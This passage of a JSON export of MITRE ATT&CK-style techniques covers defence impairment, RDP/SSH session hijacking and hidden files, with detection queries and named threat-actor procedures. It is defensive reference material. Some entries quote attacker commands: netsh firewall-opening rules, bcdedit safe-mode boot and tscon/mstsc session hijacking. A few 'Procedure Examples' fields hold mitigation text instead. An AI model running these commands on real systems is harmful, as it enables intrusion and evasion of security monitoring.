      "Monitor for changes made to firewall rules that might allow remote communication over protocols such as SMD and RDP. Modification of firewall rules might also consider opening local ports and services for different network profiles such as public and domain.",
      "Monitor for changes made to windows Registry keys and/or values that adversaries might use to disable or modify System Firewall settings such asHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy."
    ],
    "Procedure Examples": [
      "DuringAPT28 Nearest Neighbor Campaign,APT28added rules to a victim's Windows firewall to set up a series of port-forwards allowing traffic to target systems.[5]",
      "APT38have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.[6]",
      "The \"ZR\" variant ofBACKSPACEwill check to see if known host-based firewalls are installed on the infected systems.BACKSPACEwill attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.[7]",
      "BADCALLdisables the Windows firewall before binding to a port.[8]",
      "BlackBytemodified firewall rules on victim machines to enable remote system discovery.[9][10]",
      "BlackByte 2.0 Ransomwaremodifies the Windows firewall during execution.[11]",
      "BPFDoorstarts a shell on a high TCP port starting at 42391 up to 43391, then changes the localiptablesrules to redirect all packets from the attacker to the shell port.[12]",
      "Carbanakmay usenetshto add local firewall rule exceptions.[13]",
      "CookieMinerhas checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found.[14]",
      "Cyclops Blinkcan modify the Linux iptables firewall to enable C2 communication on network devices via a stored list of port numbers.[15][16]",
      "DarkCometcan disable Security Center functions like the Windows Firewall.[17][18]",
      "Dragonflyhas disabled host-based firewalls. The group has also globally opened port 3389.[19]",
      "Grandoreirocan block the Deibold Warsaw GAS Tecnologia security tool at the firewall level.[20]",
      "H1N1kills and disables services for Windows Firewall.[21]",
      "Hannotogcan modify local firewall settings vianetshcommands to open a listening UDP port.[22]",
      "HARDRAINopens the Windows Firewall to modify incoming connections.[23]",
      "HOPLIGHThas modified the firewall usingnetsh.[24]",
      "InvisiMolehas a command to disable routing and the Firewall on the victim’s machine.[25]",
      "Kasidethas the ability to change firewall settings to allow a plug-in to be downloaded.[26]",
      "Kimsukyhas been observed disabling the system firewall.[27]",
      "VariousLazarus Groupmalware modifies the Windows firewall to allow incoming connections or disable it entirely usingnetsh.[28][29][30]",
      "Leviathanmodified system firewalls to add two open listening ports on 9998 and 9999 duringLeviathan Australian Intrusions.[31]",
      "Magic Houndhas added the following rule to a victim's Windows firewall to allow RDP traffic -\"netsh\" advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow protocol=TCP localport=3389.[32][33]",
      "Moses Staffhas used batch scripts that can disable the Windows firewall on specific remote machines.[34]",
      "NanoCorecan modify the victim's firewall.[35][36]",
      "netshcan be used to disable local firewall settings.[37][38]",
      "njRAThas modified the Windows firewall to allow itself to communicate through the firewall.[39][40]",
      "OilRighas modified Windows firewall rules to enable remote access.[41]",
      "DuringOperation Wocao, threat actors used PowerShell to add and delete rules in the Windows firewall.[42]",
      "PlugXhas modified local firewall rules on victim machines to enable a random, high-number listening port for subsequent access and C2 activity.[43]",
      "PyDCrypthas modified firewall rules to allow incoming SMB, NetBIOS, and RPC connections usingnetsh.exeon remote machines.[34]",
      "Remseccan add or remove applications or ports on the Windows firewall or disable it entirely.[44]",
      "Rockeused scripts which killed processes and added firewall rules to block traffic related to other cryptominers.[45]",
      "Salt Typhoonhas made changes to the Access Control List (ACL) and loopback interface address on compromised devices.[46]",
      "ShrinkLockerturns on the system firewall and deletes all of its rules during execution.[47][48]",
      "During theSolarWinds Compromise,APT29usednetshto configure firewall rules that limited certain UDP outbound packets.[49]",
      "TeamTNThas disablediptables.[50]",
      "Prior to executing a backdoorToddyCathas runcmd /c start /b netsh advfirewall firewall add rule name=\"SGAccessInboundRule\" dir=in protocol=udp action=allow localport=49683to allow the targeted system to receive UDP packets on port 49683.[51]",
      "TYPEFRAMEcan open the Windows Firewall on the victim’s machine to allow incoming connections.[52]",
      "Velvet Antmodified system firewall settings duringPlugXinstallation usingnetsh.exeto open a listening, random high number port on victim devices.[43]",
      "ZxShellcan disable the firewall by modifying the registry keyHKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile.[53]"
    ]
  },
  "T1562.006": {
    "Name": "Impair Defenses:Indicator Blocking",
    "Description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting[1]or even disabling host-based sensors, such as Event Tracing for Windows (ETW)[2], by tampering settings that control the collection and flow of event telemetry.[3]These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such asPowerShellorWindows Management Instrumentation.For example, adversaries may modify theFilevalue inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Securityto hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.[4]ETW interruption can be achieved multiple ways, however most directly by defining conditions using thePowerShellSet-EtwTraceProvidercmdlet or by interfacing directly with the Registry to make alterations.In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors.[5]ESXi also leverages syslog, which can be reconfigured via commands such asesxcli system syslog config setandesxcli system syslog config reload.[6][7]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. Adversaries may attempt to evade system defenses by unloading minifilter drivers used by host-based sensors such as Sysmon through the use of the fltmc command-line utility. Accordingly, this analytic looks for command-line invocations of this utility when used to unload minifilter drivers.",
      "Monitor for executed processes that may attempt to block indicators or events typically captured by sensors from being gathered and analyzed.Analytic 1 - Indicator Blocking - Driver Unloaded(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image= \"fltmc.exe\" AND CommandLine= \"unload\"",
      "Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data. Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session.[3]",
      "To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers:HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME{PROVIDER_GUID}"
    ],
    "Procedure Examples": [
      "APT41developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging.[8]",
      "APT5has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring.[9]",
      "BOLDMOVEcan disable the Fortinet daemonsmoglogdandsyslogdto evade detection and logging.[10]",
      "Brute Ratel C4has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI).[11][12]",
      "Eburyhooks system functions to prevent the user from seeing malicious files (readdir,realpath,readlink,stat,open, and variants), hide process activity (psandreaddir64), and socket activity (openandfopen).[13][14]",
      "HermeticWiperhas the ability to set theHKLM:\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\CrashControl\\CrashDumpEnabledRegistry key to0in order to disable crash dumps.[15][16][17]",
      "HUI Loaderhas the ability to disable Windows Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI) functions.[18]",
      "StealBitcan configure processes to not display certain Windows error messages by through use of theNtSetInformationProcess.[19]",
      "Waterbearcan hook theZwOpenProcessandGetExtendedTcpTableAPIs called by the process of a security product to hide PIDs and TCP records from detection.[20]",
      "Woody RAThas suppressed all error reporting by callingSetErrorModewith 0x8007 as a parameter.[21]"
    ]
  },
  "T1562.007": {
    "Name": "Impair Defenses:Disable or Modify Cloud Firewall",
    "Description": "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described inDisable or Modify System Firewall.Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance.[1]They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).[2][1]Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources forBrute ForceorEndpoint Denial of Service.",
    "Detects": [
      "Monitor for changes in the status of the cloud firewall.",
      "Monitor cloud logs for modification or creation of new security groups or firewall rules. For example, in AWS environments, monitor for theAuthorizeSecurityGroupIngressAPI call in CloudTrail and use AWS Config to monitor changes the configuration of a Virtual Private Cloud (VPC) Security Group.[4]Analytic 1 - Operations performed by unexpected initiators, unusual rule names, frequent modificationsindex=\"azure_activity_logs\" OperationName=\"Create or Update Security Rule\"| stats count by InitiatorName, Resource| where Resource LIKE \"Microsoft.Network/networkSecurityGroups/securityRules\" AND (Status!=\"Succeeded\" OR InitiatorName!=\"expected_initiator\")| sort by Time"
    ],
    "Procedure Examples": [
      "Pacucan allowlist IP addresses in AWS GuardDuty.[3]"
    ]
  },
  "T1562.008": {
    "Name": "Impair Defenses:Disable or Modify Cloud Logs",
    "Description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.[1]They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.[2][3]In Office 365, an adversary may disable logging on mail collection activities for specific users by using theSet-MailboxAuditBypassAssociationcmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.[4]",
    "Detects": [
      "Monitor logs for API calls to disable logging. In AWS, monitor for:StopLogging,UpdateTrailDeleteTrail.[7]In GCP, monitor for:google.logging.v2.ConfigServiceV2.UpdateSinkandgoogle.logging.v2.ConfigServiceV2.DeleteSink.[8]In Azure, monitor foraz monitor diagnostic-settings updateandaz monitor diagnostic-settings delete.[9]Additionally, a sudden loss of a log source may indicate that it has been disabled.",
      "Monitor changes made to cloud services for unexpected modifications to settings and/or data.Analytic 1 - Operations performed by unexpected initiators, frequent modifications, changes to critical resourcesindex=\"azure_activity_logs\" OperationName=\"Create or update resource diagnostic setting\"| stats count by InitiatorName, ResourceID, Status| where Status!=\"Succeeded\" OR InitiatorName!=\"expected_initiator\"| sort by Time",
      "Monitor for changes to account settings associated with users/tenants that may impact defensive logging capabilities, such as theUpdate UserandChange User Licenseevents in the Azure AD audit log.[10]"
    ],
    "Procedure Examples": [
      "APT29has disabled Purview Audit on targeted accounts prior to stealing emails from  Microsoft 365 tenants.[5]",
      "Pacucan disable or otherwise restrict various AWS logging services, such as AWS CloudTrail and VPC flow logs.[6]"
    ]
  },
  "T1562.009": {
    "Name": "Impair Defenses:Safe Mode Boot",
    "Description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.[1][2]Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.[3]Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e.Modify Registry). MaliciousComponent Object Model(COM) objects may also be registered and loaded in safe mode.[2][4][5][6]",
    "Detects": [
      "Monitor executed commands and arguments associated with making configuration changes to boot settings, such asbcdedit.exeandbootcfg.exe.[3][16][2]",
      "Monitor newly executed processes that may abuse Windows safe mode to disable endpoint defenses.",
      "Monitor Registry creation for services that may start on safe mode. For example, a program can be forced to start on safe mode boot by adding a*in front of the \"Startup\" value name:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run[\"*Startup\"=\"{Path}\"]or by adding a key toHKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal.[6][2]",
      "Monitor modifications to Registry data associated with enabling safe mode. For example, a service can be forced to start on safe mode boot by adding a*in front of the \"Startup\" value name:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run[\"*Startup\"=\"{Path}\"]or by adding a key toHKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal.[6][2]"
    ],
    "Procedure Examples": [
      "AvosLockercan restart a compromised machine in safe mode.[7][8]",
      "Black Bastacan reboot victim machines in safe mode with networking viabcdedit /set safeboot network.[9][10][11][12][13]",
      "LockBit 3.0can reboot the infected host into Safe Mode.[14]",
      "RansomHubcan reboot targeted systems into Safe Mode prior to encryption.[15]",
      "REvilcan force a reboot in safe mode with networking.[6]"
    ]
  },
  "T1562.010": {
    "Name": "Impair Defenses:Downgrade Attack",
    "Description": "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation.Adversaries may downgrade and use various less-secure versions of features of a system, such asCommand and Scripting Interpreters or even network protocols that can be abused to enableAdversary-in-the-MiddleorNetwork Sniffing.[1]For example,PowerShellversions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent toImpair Defenseswhile running malicious scripts that may have otherwise been detected.[2][3][4]Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.[5][6]On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms.[7]",
    "Detects": [
      "Monitor for commands or other activity that may be indicative of attempts to abuse older or deprecated technologies (ex:powershell –v 2). Also monitor executed commands and arguments that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.",
      "Monitor newly executed processes that may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging.",
      "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner, or other information that may reveal use of a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging. For example, monitoring for Windows event ID (EID) 400, specifically theEngineVersionfield which shows the version of PowerShell running, may highlight a malicious downgrade attack.[12]"
    ],
    "Procedure Examples": [
      "BlackByte Ransomwareenables SMBv1 during execution.[8]",
      "DuringFrostyGoop Incident, the adversary downgraded firmware on victim devices in order to impair visibility into the process environment.[9]",
      "SILENTTRINITYcan downgrade NTLM to capture NTLM hashes.[10]"
    ]
  },
  "T1562.011": {
    "Name": "Impair Defenses:Spoof Security Alerting",
    "Description": "Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity.[1]Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.Rather than or in addition toIndicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g.,Disable or Modify Tools). An adversary can also present a \"healthy\" system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.For example, adversaries may show a fake Windows Security GUI and tray icon with a \"healthy\" system status after Windows Defender and other system tools have been disabled.[1]",
    "Detects": [
      "Consider monitoring for suspicious processes that may be spoofing security tools and monitoring messages.",
      "Monitor logging, messaging, and other artifacts highlighting the health of host sensors (e.g., metrics, errors, and/or exceptions from logging applications), especially correlating and comparing centralized telemetry against potentially suspicious notifications presented on individual systems."
    ],
    "Procedure Examples": [
      "Use application controls to mitigate installation and use of payloads that may be utilized to spoof security alerting."
    ]
  },
  "T1562.012": {
    "Name": "Impair Defenses:Disable or Modify Linux Audit System",
    "Description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.Often referred to asauditd, this is the name of the daemon used to write events to disk and is governed by the parameters set in theaudit.confconfiguration file. Two primary ways to configure the log generation rules are through the command lineauditctlutility and the file/etc/audit/audit.rules,  containing a sequence ofauditctlcommands loaded at boot time.[1][2]With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated withauditddaemon or usesystemctlto stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the/etc/audit/audit.rulesoraudit.conffiles to ignore malicious activity.[3][4]",
    "Detects": [
      "Command-line invocation of theauditctlutility may be unusual, depending on how systems are typically used in a particular environment. At runtime, look for commands to modify or create rules using theauditctlutility.",
      "Monitor for missing log files from machines with known active periods.",
      "Monitor changes made to the/etc/audit/audit.rulesfile containing the sequence ofauditctlcommands loaded at boot time.",
      "Monitor for abnormal execution of syslog and other functions associated with system logging.",
      "Using another process or third-party tools, monitor for potentially malicious modifications or access to theauditdsystem process."
    ],
    "Procedure Examples": [
      "Eburydisables OpenSSH, system (systemd), and audit logs (/sbin/auditd) when the backdoor is active.[5]"
    ]
  },
  "T1563": {
    "Name": "Remote Service Session Hijacking",
    "Description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.Adversaries may commandeer these sessions to carry out actions on remote systems.Remote Service Session Hijackingdiffers from use ofRemote Servicesbecause it hijacks an existing session rather than creating a new session usingValid Accounts.[1][2]",
    "Detects": [
      "Monitor executed commands and arguments that may take control of preexisting sessions with remote services to move laterally in an environment.(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")| search (command_line=\"attach-session\" OR command_line=\"tmux attach\" OR command_line=\"screen -r\" OR command_line=\"rdpwrap\")| stats count by user, host, parent_process_name, process_name, command_line, _time| eval hijacking_attempt=if(count > threshold OR match(command_line, \"attach|hijack|reconnect\"), \"suspicious\", \"normal\")| where hijacking_attempt=\"suspicious\"",
      "Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.sourcetype IN (\"WinEventLog:Security\", \"linux_secure\", \"macos_secure\")| search event_code=4624 OR process=\"sshd\" OR message=\"Accepted password for\"| eval abnormal_login=if(logon_type IN (\"3\", \"10\") AND src_ip IN (\"untrusted_ip_range\") AND user NOT IN (\"allowed_users\"), \"suspicious\", \"normal\")| where abnormal_login=\"suspicious\"| stats count by src_ip, user, host, logon_type, _time| table _time, src_ip, user, host, logon_type, abnormal_login",
      "Monitor network traffic for signs of hijacked sessions, such as unusual traffic patterns or unexpected session resumptions. Identify suspicious remote connections that align with ongoing user sessions.sourcetype=flow| search (dest_port=22 OR dest_port=3389 OR dest_port=23) AND (connection_state=\"ESTABLISHED\")| eval session_hijack=if(session_duration > threshold_duration AND connection_origin=\"suspicious_ip\", \"possible_hijack\", \"normal\")| where session_hijack=\"possible_hijack\"| stats count by src_ip, dest_ip, dest_port, connection_state, _time| table _time, src_ip, dest_ip, dest_port, session_hijack",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Monitor newly executed processes that may take control of preexisting sessions with remote services to move laterally in an environment."
    ],
    "Procedure Examples": [
      "Disable the remote service (ex: SSH, RDP, etc.) if it is unnecessary.",
      "Enable firewall rules to block unnecessary traffic between network security zones within a network.",
      "Set and enforce secure password policies for accounts.",
      "Do not allow remote access to services as a privileged account unless necessary.",
      "Limit remote user permissions if remote access is necessary."
    ]
  },
  "T1563.001": {
    "Name": "Remote Service Session Hijacking:SSH Hijacking",
    "Description": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.[1][2][3][4]SSH Hijackingdiffers from use ofSSHbecause it hijacks an existing SSH session rather than creating a new session usingValid Accounts.",
    "Detects": [
      "Monitor executed commands and arguments that may hijack a legitimate user's SSH session to move laterally within an environment.sourcetype IN (\"linux_secure\", \"macos_secure\")| search (command_line=\"ssh\" OR command_line=\"ssh-agent\" OR command_line=\"ssh-add\")| stats count by user, host, parent_process_name, process_name, command_line, _time| eval hijacking_attempt=if(match(command_line, \"agent|socket|hijack\"), \"suspicious\", \"normal\")| where hijacking_attempt=\"suspicious\"",
      "Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Monitor newly executed processes that may hijack a legitimate user's SSH session to move laterally within an environment."
    ],
    "Procedure Examples": [
      "Ensure that agent forwarding is disabled on systems that do not explicitly require this feature to prevent misuse.[5]",
      "Ensure SSH key pairs have strong passwords and refrain from using key-store technologies such as ssh-agent unless they are properly protected.",
      "Do not allow remote access via SSH as root or other privileged accounts.",
      "Ensure proper file permissions are set and harden system to prevent root privilege escalation opportunities."
    ]
  },
  "T1563.002": {
    "Name": "Remote Service Session Hijacking:RDP Hijacking",
    "Description": "Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[1]Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console,c:\\windows\\system32\\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user.[2]This can be done remotely or locally and with active or disconnected sessions.[3]It can also lead toRemote System Discoveryand Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.[4]",
    "Detects": [
      "monitor service creation that uses cmd.exe /k or cmd.exe /c in its arguments to detect RDP session hijacking. Windows PowerShell log Event ID 4104 (PS script execution) can be used to capture PowerShell script block contents which may contain commands used as a precursor to RDP hijacking. For example, the following command in a PowerShell script block may be used to enumerate the systems on a network which have RDP access:Find-DomainLocalGroupMember -GroupName \"Remote Desktop Users\" | select -expand ComputerName.",
      "Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Windows security log Event ID 4624 (An account was successfully logged on) is generated when a user logs onto a remote machine using RDP.Correlating logon session creation events with RDP network flows can provide a clearer picture of RDP activity and serve as a useful starting point for investigating suspicious RDP connections.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)). Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols including RDP.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. RDP sessions may be split up into multiple flows and would therefore need to be aggregated.Anomaly detection using machine learning or other methods based on baselined RDP network flows may be a viable approach to alerting on potential RDP session hijacking.",
      "Consider monitoring processes for tscon.exe usage. Using tscon.exe to hijack an RDP session requires SYSTEM level permissions. Therefore, we recommend also looking for Privilege Escalation techniques that may be used for this purpose in conjunction with RDP Session Hijacking.In addition to tscon.exe,  mstsc.exe can similarly be used to hijack existing RDP sessions. In this case, we recommend looking for the command-line parameters of/noconsentPromptand/shadow:, which allow for stealthy hijacking of an RDP session with no prompt and without kicking off the existing session."
    ],
    "Procedure Examples": [
      "Axiomhas targeted victims with remote administration tools including RDP.[5]",
      "WannaCryenumerates current remote desktop sessions and tries to execute the malware on each session.[6]"
    ]
  },
  "T1564": {
    "Name": "Hide Artifacts",
    "Description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.[1][2][3]Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.[4]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor executed commands and arguments that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for newly constructed files that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for changes made to files that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for changes made to firewall rules for unexpected modifications to allow/block specific network traffic that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for API calls that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor newly executed processes that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
      "Monitor for newly constructed services/daemons that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for newly constructed user accounts that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for contextual data about an account, which may include a username, user ID, environmental data that may attempt to hide artifacts associated with their behaviors to evade detection.",
      "Monitor for changes made to windows registry keys and/or values that may attempt to hide artifacts associated with their behaviors to evade detection."
    ],
    "Procedure Examples": [
      "Bundloreuses themktemputility to make unique file and directory names for payloads, such asTMP_DIR=`mktemp -d -t x.[5]",
      "DarkTortillahas used%HiddenReg%and%HiddenKey%as part of its persistence via the Windows registry.[6]",
      "OSX/Shlayerhas used themktemputility to make random and unique filenames for payloads, such asexport tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\"ormktemp -t Installer.[7][5][8]",
      "Tarraskis able to create \"hidden\" scheduled tasks by deleting the Security Descriptor (SD) registry value.[9]",
      "WarzoneRATcan masquerade the Process Environment Block on a compromised host to hide its attempts to elevate privileges throughIFileOperation.[10]"
    ]
  },
  "T1564.001": {
    "Name": "Hide Artifacts:Hidden Files and Directories",
    "Description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /afor Windows andls –afor Linux and macOS).On Linux and Mac, users can mark specific files as hidden simply by putting a \".\" as the first character in the file or folder name[1][2]. Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like \"ls\". Users must specifically change settings to have these files viewable.Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app[3]. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
    "Detects": [
      "Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.",
      "Monitor the file system and shell commands for files being created with a leading \".\"",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions may set files and directories to be hidden to evade detection mechanisms.",
      "Monitor newly executed processes that may set files and directories to be hidden to evade detection mechanisms."
    ],
    "Procedure Examples": [
      "Agent Teslahas created hidden folders.[4]",
      "AppleJeushas added a leading.to plist filenames, unlisting them from the Finder app and default Terminal directory listings.[5]",
      "APT28has saved files with hidden file attributes.[6][6]",
      "APT32's macOS backdoor hides the clientID file via a chflags function.[7]",
      "Attorcan set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.[8]",
      "attribcan be used to make files or directories hidden.[9][10][11][12][13]",
      "BackConfighas the ability to set folders or files to be hidden from the Windows Explorer default view.[14]",
      "Calistouses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.[15][16]",
      "Carberphas created a hidden file in the Startup folder of the current user.[17]",
